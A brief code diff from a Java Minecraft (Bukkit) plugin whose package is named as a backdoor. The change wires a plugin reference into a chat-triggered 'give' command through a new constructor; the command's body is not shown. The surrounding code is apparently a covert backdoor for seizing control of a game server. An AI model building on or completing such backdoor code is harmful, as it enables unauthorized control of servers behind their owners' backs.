@@ -2,6 +2,7 @@ package me.tsb.backdoor.commands;
 
 import me.tsb.backdoor.Command;
 import me.tsb.backdoor.RegisterCommand;
+import me.tsb.plugin.Main;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Material;
@@ -13,6 +14,12 @@ import java.util.ArrayList;
 
 @RegisterCommand(displayName = "give", aliases = {"give"})
 public class GiveCommand extends Command {
+
+    private final Main main;
+
+    public GiveCommand (Main main) {
+        this.main = main;
+    }
 
     @Override
     public void onExec(PlayerChatEvent event, ArrayList<String> args) {
